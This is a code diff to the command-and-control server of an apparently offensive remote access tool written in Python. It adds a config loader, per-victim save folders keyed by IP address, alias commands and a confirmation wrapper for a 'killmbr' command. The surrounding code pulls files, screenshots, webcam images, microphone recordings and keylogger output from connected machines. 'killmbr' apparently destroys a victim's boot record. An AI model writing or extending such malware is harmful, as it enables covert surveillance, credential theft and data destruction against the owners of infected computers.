@@ -76,6 +76,19 @@ class Server:
         self.socket = None
         self.connections = []
         self.addresses = []
+        self.save_dir = os.getcwd()
+
+    def load_config(self):
+        try:
+            if os.path.isfile('config/conf'):
+                f = open('config/conf', 'r')
+                conf = json.load(f)
+                self.port = conf['port']
+                if os.path.isdir(conf['save_dir']):
+                    self.save_dir = conf['save_dir']
+                f.close()
+        except Exception as exception:
+            print('[-] Load configuration error: ' + str(exception))
 
     def listen(self):
         try:
@@ -124,7 +137,9 @@ class Server:
                 elif cmd == 'ls':
                     Helper.lls()
                 elif cmd.split(' ')[0] == 'alias':
-                    Alias.handle_aliases(' '.join(cmd.strip().split()))
+                    Alias.alias(' '.join(cmd.strip().split()))
+                elif cmd.split(' ')[0] == 'unalias':
+                    Alias.unalias(cmd.strip().split())
                 else:
                     print('[-] Command not recognized')
             except KeyboardInterrupt:
@@ -188,6 +203,8 @@ class Server:
                 elif cmd in Helper.cmds.keys():
                     print('----- {} -----'.format(cmd))
                     Helper.select(conn, Helper.cmds.get(cmd))
+                elif cmd in ['killmbr']:
+                    Helper.show_warn(conn, cmd)
                 elif hasattr(command, cmd_name):
                     func = getattr(command, cmd_name)
                     func(conn, cmd)
@@ -238,27 +255,27 @@ class Command:
     def download(conn, cmd):
         filename = Helper.get_args(cmd)
         Helper.send(conn, cmd)
-        Helper.recv_file(conn, ntpath.basename(filename))
+        Helper.recv_file(conn, Helper.get_client_dir(conn, ntpath.basename(filename)))
 
     @staticmethod
     def screenshot(conn, cmd):
         Helper.send(conn, cmd)
-        Helper.recv_file(conn, 'Screenshot{}.png'.format(Helper.get_time()))
+        Helper.recv_file(conn, Helper.get_client_dir(conn, 'Screenshot{}.png'.format(Helper.get_time())))
 
     @staticmethod
     def webcam(conn, cmd):
         Helper.send(conn, cmd)
-        Helper.recv_file(conn, 'Webcam{}.png'.format(Helper.get_time()))
+        Helper.recv_file(conn, Helper.get_client_dir(conn, 'Webcam{}.png'.format(Helper.get_time())))
 
     @staticmethod
     def record(conn, cmd):
         Helper.send(conn, cmd)
-        Helper.recv_file(conn, 'Microphone{}.png'.format(Helper.get_time()))
+        Helper.recv_file(conn, Helper.get_client_dir(conn, 'Microphone{}.png'.format(Helper.get_time())))
 
     @staticmethod
     def keylogger_save(conn, cmd):
         Helper.send(conn, cmd)
-        Helper.recv_file(conn, 'Keylog{}.txt'.format(Helper.get_time()))
+        Helper.recv_file(conn, Helper.get_client_dir(conn, 'Keylog{}.txt'.format(Helper.get_time())))
 
     @staticmethod
     def filewatch(conn, cmd):
@@ -294,7 +311,7 @@ class Alias:
     aliases = {}
 
     @staticmethod
-    def handle_aliases(cmd):
+    def alias(cmd):
         args = cmd.split(' ')
         if len(args) == 1:
             print('----- Aliases -----')
@@ -302,35 +319,37 @@ class Alias:
                 print('{0:15}{1}'.format(k, v))
             print()
             return
-        command = args[0]
-        subcommand = args[1]
-        if subcommand == 'create':
-            if len(args) < 4:
-                print('[-] Usage: alias create <alias> <command>')
-                return
-            alias = cmd.split(' ')[2]
-            Alias.aliases[alias] = cmd[len(command + subcommand + alias) + 3:]
-            Alias.save_aliases()
-            print('[+] Create alias success')
-        elif subcommand == 'remove':
-            if len(args) < 3:
-                print('[-] Usage: alias remove <alias>')
-                return
-            alias = cmd[len(command + subcommand) + 2:]
-            if alias not in Alias.aliases:
-                print('[-] Alias does not exist: {}'.format(alias))
-                return
-            del Alias.aliases[alias]
-            Alias.save_aliases()
-            print('[+] Remove alias success')
-        else:
-            print('[-] Unknown command: {}'.format(subcommand))
+        equal_mark = cmd.find('=')
+        if equal_mark == -1:
+            print('Usage: <alias_name>=<command>')
+            return
+        alias_name = cmd[6:equal_mark].strip()
+        command = cmd[equal_mark + 1:].strip()
+        if len(alias_name) == 0 or len(command) == 0:
+            print('Usage: <alias_name>=<command>')
+            return
+        Alias.aliases[alias_name] = command
+        Alias.save_aliases()
+        print('[+] Alias created: {}'.format(alias_name))
+
+    @staticmethod
+    def unalias(cmd):
+        if len(cmd) == 1:
+            print('Usage: unalias <alias_name>')
+            return
+        alias = cmd[1]
+        if alias not in Alias.aliases:
+            print('[-] Alias does not exist: {}'.format(alias))
+            return
+        del Alias.aliases[alias]
+        Alias.save_aliases()
+        print('[+] Alias removed: {}'.format(alias))
 
     @staticmethod
     def load_aliases():
         try:
-            if os.path.isfile('alias.json'):
-                f = open('alias.json', 'r')
+            if os.path.isfile('config/alias'):
+                f = open('config/alias', 'r')
                 Alias.aliases = json.load(f)
                 f.close()
         except Exception as exception:
@@ -340,7 +359,7 @@ class Alias:
     def save_aliases():
         try:
             alias_json = json.dumps(Alias.aliases)
-            f = open('alias.json', 'w')
+            f = open('config/alias', 'w')
             f.write(alias_json)
             f.close()
         except Exception as exception:
@@ -429,6 +448,23 @@ class Helper:
             Helper.send(conn, 'null')
 
     @staticmethod
+    def show_warn(conn, cmd):
+        try:
+            if '-y' in cmd:
+                Helper.send(conn, cmd)
+                return
+            confirm = input('This operation cannot be undone, are you sure? ')
+            if confirm.lower() == 'y':
+                Helper.send(conn, cmd)
+                print(Helper.recv_text(conn))
+            else:
+                print('[-] Aborted')
+                Helper.send(conn, 'null')
+        except KeyboardInterrupt:
+            print('\n[-] Aborted')
+            Helper.send(conn, 'null')
+
+    @staticmethod
     def get_args(cmd):
         cmd_name = cmd.split(' ')[0]
         cmd_arg = cmd[len(cmd_name) + 1:].strip()
@@ -487,8 +523,19 @@ class Helper:
         except Exception as e:
             Helper.print_error('[-] Error: ' + str(e))
 
+    @staticmethod
+    def get_client_dir(conn, filename):
+        address = server.addresses[server.connections.index(conn)]
+        client_directory = os.path.join(server.save_dir, '{}'.format(address[0]))
+        if not os.path.isdir(client_directory):
+            os.mkdir(client_directory)
+        save_path = os.path.join(client_directory, filename)
+        print(save_path)
+        return save_path
+
 
 server = Server()
+server.load_config()
 server.listen()
 threading.Thread(target=server.accept, daemon=True).start()
 Alias.load_aliases()
